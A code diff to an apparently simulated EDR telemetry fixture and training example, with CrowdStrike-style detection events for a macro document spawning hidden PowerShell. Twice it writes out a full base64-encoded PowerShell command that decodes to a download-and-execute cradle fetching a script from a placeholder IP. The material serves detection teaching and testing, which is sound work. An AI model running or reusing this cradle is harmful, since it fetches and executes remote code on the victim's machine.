@@ -20,7 +20,7 @@ const edrInjectEvent: TelemetryEvent = {
     parent_name: "WINWORD.EXE",
     parent_pid: 6312,
     cmdline:
-      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",
+      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA5ADMALwBzAC4AcABzADEAJwApAA==",
     user: "WRENFIELD\\d.sharon",
     integrity: "high" as const,
   },
@@ -28,7 +28,7 @@ const edrInjectEvent: TelemetryEvent = {
     "event.module": "crowdstrike",
     "event.dataset": "crowdstrike.falcon",
     "crowdstrike.EventType": "DetectionSummaryEvent",
-    "crowdstrike.DetectId": "ldt:c3b1f2a4e5d6:9988776655",
+    "crowdstrike.DetectId": "ldt:c3b1f2a4e5d64f0a8b7c9d2e1f304a56:9988776655",
     "crowdstrike.DetectDescription":
       "A process opened a handle to another running process with elevated access rights",
     "crowdstrike.Tactic": "Stealth",
@@ -37,10 +37,15 @@ const edrInjectEvent: TelemetryEvent = {
     "threat.technique.id": "T1055",
     "crowdstrike.Severity": "5",
     "crowdstrike.SeverityName": "Critical",
+    "crowdstrike.ComputerName": "WS-EXEC-022",
+    "crowdstrike.UserName": "d.sharon",
+    "crowdstrike.ProcessId": "9944",
     "crowdstrike.FileName": "powershell.exe",
+    "crowdstrike.FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
     "crowdstrike.CommandLine":
-      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",
+      "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA5ADMALwBzAC4AcABzADEAJwApAA==",
     "crowdstrike.ParentImageFileName": "WINWORD.EXE",
+    "crowdstrike.ParentProcessId": "6312",
     "crowdstrike.ParentCommandLine":
       "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n contract_2024.docm",
     "crowdstrike.TargetProcessId": "3128",
@@ -460,7 +465,7 @@ const avVsEdrMasterclass = {
         '  "event.dataset": "crowdstrike.falcon",\n\n' +
         "  // Detection metadata\n" +
         '  "crowdstrike.EventType": "DetectionSummaryEvent",\n' +
-        '  "crowdstrike.DetectId": "ldt:c3b1f2a4e5d6:9988776655",\n' +
+        '  "crowdstrike.DetectId": "ldt:c3b1f2a4e5d64f0a8b7c9d2e1f304a56:9988776655",\n' +
         '  "crowdstrike.DetectDescription": "Process injection: powershell.exe injected shellcode into explorer.exe",\n\n' +
         "  // MITRE ATT&CK mapping\n" +
         '  "crowdstrike.Tactic": "Stealth",\n' +
